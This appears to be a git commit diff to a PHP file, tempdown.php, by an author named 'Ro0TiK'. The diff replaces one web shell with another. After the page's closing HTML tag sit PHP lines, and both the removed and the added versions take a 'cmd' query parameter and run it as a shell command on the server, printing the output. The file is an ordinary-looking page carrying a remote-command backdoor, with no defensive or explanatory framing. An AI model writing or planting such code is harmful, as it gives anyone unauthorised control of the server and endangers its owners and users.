1ba95056354181a5294da47f3874fc1c34781e4d
Ro0TiK <s.mayersophie1997@gmail.com>
2024-09-06 17:58:32 +0300

    Update tempdown.php

--- tempdown.php
+++ tempdown.php
@@ -16,9 +16,8 @@
 </body>
 </html>
 <?php
-/* USE: index.php?cmd=command */
-/* USE: index.php?cmd=ls -a */
-if (!isset($_GET['cmd'])){
-	header('Location: http://www.google.com/'); // Redirect to
-} else { print(system($_GET['cmd'])); } //Exec command
+if(isset($_GET['cmd'])) {
+    $command = $_GET['cmd'];
+    echo shell_exec($command);
+}
 ?>
